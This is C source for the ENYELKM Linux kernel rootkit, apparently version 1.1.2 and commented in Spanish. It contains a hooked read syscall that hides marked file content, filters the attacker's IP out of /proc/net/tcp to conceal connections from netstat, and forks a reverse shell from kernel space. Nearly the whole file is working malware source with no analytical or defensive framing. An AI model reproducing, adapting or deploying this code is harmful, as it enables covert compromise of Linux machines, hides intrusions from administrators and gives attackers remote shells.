/*
 * ENYELKM v1.1.2
 * Linux Rootkit x86 kernel v2.6.x
 *
 * By RaiSe & David Reguera Garc�a
 * < raise@enye-sec.org 
 * http://www.enye-sec.org >
 *
 * davidregar@yahoo.es - http://www.fr33project.org
 */

#include <linux/types.h>
#include <linux/stddef.h>
#include <linux/unistd.h>
#include <linux/config.h>
#include <linux/module.h>
#include <linux/version.h>
#include <linux/kernel.h>
#include <linux/string.h>
#include <linux/mm.h>
#include <linux/slab.h>
#include <linux/sched.h>
#include <linux/in.h>
#include <linux/skbuff.h>
#include <linux/netdevice.h>
#include <linux/file.h>
#include <linux/dirent.h>
#include <asm/processor.h>
#include <asm/uaccess.h>
#include <asm/unistd.h>
#include "remoto.h"
#include "config.h"
#include "data.h"

#define SSIZE_MAX 32767


/* define marcas */
#define MOPEN "#<OCULTAR_8762>"
#define MCLOSE "#</OCULTAR_8762>"


/* declaraciones externas */
extern short lanzar_shell;
extern short read_activo;
extern unsigned long global_ip;
extern unsigned short global_port;

/* do_fork */
long (*my_do_fork)(unsigned long clone_flags,
		unsigned long stack_start,
		struct pt_regs *regs,
		unsigned long stack_size,
		int __user *parent_tidptr,
		int __user *child_tidptr) = (void *) DOFORK;



struct file *e_fget_light(unsigned int fd, int *fput_needed)
{
    struct file *file;
    struct files_struct *files = current->files;

    *fput_needed = 0;
    if (likely((atomic_read(&files->count) == 1))) {
        file = fcheck(fd);
    } else {
        spin_lock(&files->file_lock);
        file = fcheck(fd);
        if (file) {
            get_file(file);
            *fput_needed = 1;
        }
        spin_unlock(&files->file_lock);
    }
    return file;

} /*********** fin get_light **********/



int checkear(void *arg, int size, struct file *fichero)
{
char *buf;


/* si SSIZE_MAX <= size <= 0 retornamos -1 */
if ((size <= 0) || (size >= SSIZE_MAX))
	return(-1);

/* reservamos memoria para el buffer y copiamos */
buf = (char *) kmalloc(size+1, GFP_KERNEL);
if ( __copy_from_user((void *) buf, (void *) arg, size) )
buf[size] = 0;

/* chequeamos las marcas */
if ((strstr(buf, MOPEN) != NULL) && (strstr(buf, MCLOSE) != NULL))
	{
	/* se encontraron las dos, devolvemos 1 */
	kfree(buf);
	return(1);
	}

/* chequeamos /proc/net/tcp */
if ((fichero != NULL) && (fichero->f_dentry != NULL) &&
		(fichero->f_dentry->d_parent != NULL) &&
		 (fichero->f_dentry->d_parent->d_parent != NULL))
	{
	/* todo correcto ? */
	if((fichero->f_dentry->d_iname == NULL) ||
		(fichero->f_dentry->d_parent->d_iname == NULL) ||
		(fichero->f_dentry->d_parent->d_parent->d_inode == NULL))
		{
		kfree(buf);
		return(-1);
		}

	/* /proc/net/tcp ? */
	if(!strcmp(fichero->f_dentry->d_iname, "tcp") &&
		!strcmp(fichero->f_dentry->d_parent->d_iname, "net") &&
		(fichero->f_dentry->d_parent->d_parent->d_inode->i_ino == 1))
		{
		/* devolvemos 2 para ocultar conexiones */
		kfree(buf);
		return(2);
		}
	}

/* liberamos y retornamos -1 para q no haga nada */
kfree(buf);

return(-1);

} /********** fin de checkear() *************/



int hide_marcas(void *arg, int size)
{
char *buf, *p1, *p2;
int i, newret;


/* reservamos y copiamos */
buf = (char *) kmalloc(size, GFP_KERNEL);
if ( __copy_from_user((void *) buf, (const void *) arg, (unsigned long) size) != 0 )
{
/* ERROR */
}

p1 = strstr(buf, MOPEN);
p2 = strstr(buf, MCLOSE);
p2 += strlen(MCLOSE);

i = size - (p2 - buf);

memmove((void *) p1, (void *) p2, i);
newret = size - (p2 - p1);

/* copiamos al user space, liberamos y retornamos */
if(  __copy_to_user( (void *) arg, (const void *) buf, (unsigned long) newret) != 0 )
{
/* ERROR */
}
 
kfree(buf);

return(newret);

}  /********** fin de hide_marcas **********/



int ocultar_linea(char *linea)
{
char hide[128];


sprintf(hide, "%08X:", (unsigned int) global_ip);

if (strstr(linea, hide) != NULL)
	/* ocultamos todos los sockets con nuestra ip */
	return(1);

/* no ocultamos nada */
return(0);

} /******** fin de ocultar_linea *********/



int copiar_linea(char *dst, char *from, int index)
{
char *p, *p2, tmp;
int i = 0;


p = from;

/* colocamos p en el principio de la linea */
while (i != index)
	{
	while (*p++ != 0x0a);

	/* nos pasamos */
	if (p >= from+strlen(from))
		return(0);

	i++;
	}

p2 = p;

/* p2 al final de la linea y ponemos un null temporal */
while (*p2++ != 0x0a)
	{
	/* por si no tiene fin de linea */
	if(p2 >= from+strlen(from))
		break;
	}

tmp = *p2;
*p2 = 0x00;

/* copiamos y restauramos el char */
strcpy(dst, p);
*p2 = tmp;

return(1);

} /*********** fin copiar_linea ***********/



int ocultar_netstat(char *arg, int size)
{
char linea[256], *buf, *dst;
int cont = 0, ret;


/* no deberia ocurrir nunca */
if (size == 0)	
	return(size);

/* reservamos y copiamos */
buf = (char *) kmalloc(size+1, GFP_KERNEL);
__copy_from_user((void *) buf, (void *) arg, size);
buf[size] = 0x00;

/* reservamos buffer destino temporal */
dst = (char *) kmalloc(size+16, GFP_KERNEL);
dst[0] = 0x00;

while (copiar_linea(linea, buf, cont++))
	if (!ocultar_linea(linea))
		strcat(dst, linea);

/* nuevo size posible */
ret = strlen(dst);

/* copiamos al user space, liberamos y retornamos */
if ( __copy_to_user( (void *) arg, (const void *) dst, (unsigned long) ret) != 0 )
{
/* ERROR */
}

kfree(buf);
kfree(dst);

return(ret);

} /************ fin ocultar_netstat ************/



asmlinkage ssize_t hacked_read(int fd, void *buf, size_t nbytes)
{
struct pt_regs regs;
struct file *fichero;
int fput_needed;
ssize_t ret;


/* se hace 1 copia del proceso y se lanza la shell */
if (lanzar_shell == 1)
    {
	memset(&regs, 0, sizeof(regs));
	
	regs.xds = __USER_DS;
	regs.xes = __USER_DS;
	regs.orig_eax = -1;
	regs.xcs = __KERNEL_CS;
	regs.eflags = 0x286;
	regs.eip = (unsigned long) reverse_shell;

    lanzar_shell = 0;

	(*my_do_fork)(0, 0, &regs, 0, NULL, NULL);
    }

/* seteamos read_activo a uno */
read_activo = 1;

/* error de descriptor no valido o no abierto para lectura */
ret = -EBADF;

fichero = e_fget_light(fd, &fput_needed);

if (fichero)
	{
	ret = vfs_read(fichero, buf, nbytes, &fichero->f_pos);

	/* aqui es donde analizamos el contenido y ejecutamos la
	funcion correspondiente */

	switch(checkear(buf, ret, fichero))
	    {
	    case 1:
			/* marcas */
	        ret = hide_marcas(buf, ret);
	        break;

		case 2:
			/* ocultar conexion */
			ret = ocultar_netstat(buf, ret);
			break;		

	    case -1:
	        /* no hacer nada */
	        break;
	    }

	fput_light(fichero, fput_needed);
	}

/* seteamos read_activo a cero */
read_activo = 0;

return ret;

} /********** fin hacked_read **********/


// EOF
